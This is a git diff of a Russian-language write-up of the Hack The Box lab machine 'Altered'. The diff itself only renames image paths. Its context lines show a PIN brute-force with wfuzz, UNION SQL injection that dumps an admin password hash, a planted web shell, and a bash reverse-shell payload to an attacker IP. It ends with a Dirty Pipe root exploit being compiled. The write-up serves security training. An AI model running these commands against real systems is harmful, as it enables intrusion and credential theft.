@@ -1,6 +1,6 @@
 # Altered (2022)
 
-![](<../../../.gitbook/assets/image (4) (1).png>)
+![](<../../../.gitbook/assets/image (4) (1) (1).png>)
 
 ### Содержание:
 
@@ -28,17 +28,17 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 
-![](<../../../.gitbook/assets/image (7) (1).png>)
+![](<../../../.gitbook/assets/image (7) (1) (1).png>)
 
 ### Угадываем имя пользователя:
 
 Через данную форму можно угадывать имена пользователей, например, я ввел - "**admin"**:
 
-![](<../../../.gitbook/assets/image (9) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1).png>)
 
 Также можно восстановить пароль, но нужно знать пинкод, следовательно, можно его пробрутить:
 
-![](<../../../.gitbook/assets/image (13) (1).png>)
+![](<../../../.gitbook/assets/image (13) (1) (1).png>)
 
 ### Обходим Rate Limit и брутим пинкод:
 
@@ -66,11 +66,11 @@ wfuzz -H 'Cookie: XSRF-TOKEN=eyJpdiI6InlZZUE4bUkvODdaL2s5UHVHYVYzenc9PSIsInZhbHV
 
 Пинкод - 5118, введя его и изменив пароль админа, мы можем войти в панель:
 
-![](<../../../.gitbook/assets/image (15) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1).png>)
 
 При клике на ссылку **view** у нас образуется **GET-запрос** с двумя параметрами **id** и **secret**:
 
-![](<../../../.gitbook/assets/image (3) (1).png>)
+![](<../../../.gitbook/assets/image (3) (1) (1).png>)
 
 ### Обходим фильтры и эксплуатируем SQLi:
 
@@ -97,19 +97,19 @@ Content-Length: 60
 }
 ```
 
-![](<../../../.gitbook/assets/image (11) (1).png>)
+![](<../../../.gitbook/assets/image (11) (1) (1).png>)
 
-![](<../../../.gitbook/assets/image (1) (1).png>)
+![](<../../../.gitbook/assets/image (1) (1) (1).png>)
 
 Далее я просто раскрутил **UNION SQLi**([о ней я тоже сделал статью](https://tragernout.gitbook.io/hackandgtfo/owasp-top-10/sql-union-injection)):
 
 * Подбираем количество столбцов в **БД**, которая сейчас используется с помощью **null**:
 
-![](<../../../.gitbook/assets/image (16) (1).png>)
+![](<../../../.gitbook/assets/image (16) (1) (1).png>)
 
 * Смотрим какие есть базы данных:
 
-![](<../../../.gitbook/assets/image (2) (1).png>)
+![](<../../../.gitbook/assets/image (2) (1) (1).png>)
 
 ```
 {
@@ -160,13 +160,13 @@ admin@htb.local:admin:$2y$10$uYmwbmWFdhy6mFXFPqgU3uDJDg1pJFJfWStkcaJY7LLJ69G17Gd
 
 Мы можем читать файлы, следовательно, можем найти корневую папку сервера:
 
-![](<../../../.gitbook/assets/image (12) (1).png>)
+![](<../../../.gitbook/assets/image (12) (1) (1).png>)
 
 Теперь попробуем создать свой файл **html**, записать в него что-то и проверить, имеем ли мы права создавать и редактировать файлы:
 
-![](<../../../.gitbook/assets/image (6) (1).png>)
+![](<../../../.gitbook/assets/image (6) (1) (1).png>)
 
-![](<../../../.gitbook/assets/image (18) (1).png>)
+![](<../../../.gitbook/assets/image (18) (1) (1).png>)
 
 Все работает, переходим к созданию реверс шелла:
 
@@ -177,17 +177,17 @@ admin@htb.local:admin:$2y$10$uYmwbmWFdhy6mFXFPqgU3uDJDg1pJFJfWStkcaJY7LLJ69G17Gd
 }
 ```
 
-![](<../../../.gitbook/assets/image (8) (1).png>)
+![](<../../../.gitbook/assets/image (8) (1) (1).png>)
 
 Но веб шелл нас не устраивает, поэтому перехватываем запрос и меняем его метод, а потом в параметр **cmd** вставляем наш пэйлоад в **URL-энкоде**:
 
-![](<../../../.gitbook/assets/image (5) (1).png>)
+![](<../../../.gitbook/assets/image (5) (1) (1).png>)
 
 ```
 cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.44/9898+0>%261'
 ```
 
-![](<../../../.gitbook/assets/image (10) (1).png>)
+![](<../../../.gitbook/assets/image (10) (1) (1).png>)
 
 ### Рутируемся через Dirty Pipe(CVE-2022-0847):
 
@@ -212,4 +212,4 @@ $ gcc exploit-2.c -o exploit
 $ python3 -m http.server
 ```
 
-![](<../../../.gitbook/assets/image (19) (1).png>)
+![](<../../../.gitbook/assets/image (19) (1) (1).png>)
